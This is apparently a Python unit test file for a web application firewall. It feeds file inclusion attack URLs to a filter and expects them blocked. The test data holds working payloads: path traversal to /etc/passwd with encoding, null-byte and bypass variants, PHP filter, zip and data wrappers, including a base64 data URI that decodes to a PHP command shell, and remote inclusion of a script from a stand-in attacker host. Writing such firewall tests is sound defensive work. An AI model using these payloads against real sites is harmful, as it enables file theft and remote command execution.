import unittest

from web_application_firewall.project import filtering

"""
Path_Traversal_1 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
Path_Traversal_2 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
Path_Traversal_3 = "http://vulnerable-site.com/index.php?page=....\/....\/....\/etc/passwd"
Path_Traversal_4 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"

Null_Byte_Injection = "http://vulnerable-site.com/index.php?page=../../../etc/passwd%00"

Encoding_1 = "http://vulnerable-site.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd"
Encoding_2 = "http://vulnerable-site.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
Encoding_3 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd"
Encoding_4 = "http://vulnerable-site.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"

Existing_Folder = "http://vulnerable-site.com/index.php?page=utils/scripts/../../../../../etc/passwd"

Path_Truncation_1 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\."
Path_Truncation_2 = "http://vulnerable-site.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././."
Path_Truncation_3 = "http://vulnerable-site.com/index.php?page=a/./.[ADD MORE]/etc/passwd"
Path_Truncation_4 = "http://vulnerable-site.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd"


RFI_1 = "http://vulnerable-site.com/index.php?page=http://atacker.com/evil.php"
RFI_2 = "http://vulnerable-site.com/index.php?page=\\attacker.com\evil.php"



"""
class testFileInclusion(unittest.TestCase):

    def testSanity(self):
        self.assertEqual(True,True)

    def testGoodPacket(self):
        normal_1 = "http://www.google.com/page/"

        result = filtering.check(normal_1)
        self.assertEqual(result, "200")

    def testPHPWrapper(self):
        filter_1 = "http://vulnerable-site.com/index.php?page=php://filter/read=string.rot13/resource=index.php"
        filter_2 = "http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"
        filter_3 = "http://vulnerable-site.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"

        zlib = "http://vulnerable-site.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
        zip_wrapper = "http://vulnerable-site.com/index.php?page=zip://shell.jpg%23payload.php"

        data_1 = "http://vulnerable-site.com/?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>\""
        data_2 = "http://vulnerable-site.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="

        packets = [filter_1,filter_2,filter_3,zlib,zip_wrapper,data_1,data_2]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403")

    def testFilterBypass(self):
        filter_bypass_1 = "http://vulnerable-site.com/index.php?page=....//....//etc/passwd"
        filter_bypass_2 = "http://vulnerable-site.com/index.php?page=..///////..////..//////etc/passwd"
        filter_bypass_3 = "http://vulnerable-site.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
        filter_bypass_4 = "http://vulnerable-site.com/index.php?page=/var/www/../../etc/passwd"
        filter_bypass_5 = "http://vulnerable-site.com/index.php?page=../../../etc/passwd"
        filter_bypass_6 = "http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd"
        filter_bypass_7 = "http://vulnerable-site.com/index.php?page=....\\/....\\/....\\/etc/passwd"
        filter_bypass_8 = "http://vulnerable-site.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"

        packets = [filter_bypass_1, filter_bypass_2, filter_bypass_3, filter_bypass_4, filter_bypass_5, filter_bypass_6, filter_bypass_7, filter_bypass_8]

        result = ""
        for i in packets:
            result = filtering.check(i)
            if result == "200":
                break
        self.assertEqual(result, "403")


if __name__ == '__main__':
    unittest.main()
